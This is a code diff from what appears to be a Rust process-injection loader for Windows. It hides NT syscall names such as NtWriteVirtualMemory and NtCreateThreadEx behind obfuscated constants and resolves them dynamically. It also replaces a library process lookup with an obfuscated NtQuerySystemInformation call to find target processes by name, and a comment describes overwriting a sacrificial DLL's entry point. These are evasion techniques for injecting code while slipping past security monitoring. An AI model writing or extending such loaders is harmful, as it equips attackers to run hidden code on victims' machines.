@@ -64,6 +64,7 @@ const OBF_C: &[u8] = &{{OBF_NT_WRITE_VIRTUAL_MEMORY}};
 const OBF_D: &[u8] = &{{OBF_NT_PROTECT_VIRTUAL_MEMORY}};
 const OBF_E: &[u8] = &{{OBF_NT_CREATE_THREAD_EX}};
 const OBF_H: &[u8] = &{{OBF_NT_DELAY_EXECUTION}};
+const OBF_Q: &[u8] = &{{OBF_NT_QUERY_SYSTEM_INFORMATION}};
 
 type FA = unsafe extern "system" fn(*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32;
 type FB = unsafe extern "system" fn(HANDLE, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
@@ -71,6 +72,7 @@ type FC = unsafe extern "system" fn(HANDLE, *mut c_void, *mut c_void, usize, *mu
 type FD = unsafe extern "system" fn(HANDLE, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
 type FE = unsafe extern "system" fn(*mut HANDLE, u32, *mut c_void, HANDLE, *mut c_void, *mut c_void, u32, usize, usize, usize, *mut c_void) -> i32;
 type FH = unsafe extern "system" fn(u32, *const i64) -> i32;
+type FQ = unsafe extern "system" fn(u32, *mut c_void, usize, *mut usize) -> i32;
 
 #[repr(C)]
 struct CLIENT_ID {
@@ -125,16 +127,17 @@ unsafe fn resolve_entry_point(base: usize) -> Option<*mut c_void> {
 
 // Find PIDs whose process name matches `tar`.
 fn find_process_ids_by_name(tar: &str) -> Vec<usize> {
-    use sysinfo::System;
-    let mut dom: Vec<usize> = Vec::new();
-    let s = System::new_all();
-    let tar_lower = tar.to_lowercase();
-    for (_, pro) in s.processes() {
-        if pro.name().to_string_lossy().to_lowercase() == tar_lower {
-            dom.push(pro.pid().as_u32() as usize);
-        }
+    unsafe {
+        let query: FQ = std::mem::transmute(common::resolve_nt_api_address(OBF_Q, K));
+        common::find_process_ids_by_name(tar, |buffer, len| {
+            query(
+                common::SYSTEM_PROCESS_INFORMATION_CLASS,
+                buffer as *mut c_void,
+                len,
+                null_mut(),
+            )
+        })
     }
-    dom
 }
 
 // Load a benign sacrificial DLL into THIS process, then overwrite its entry
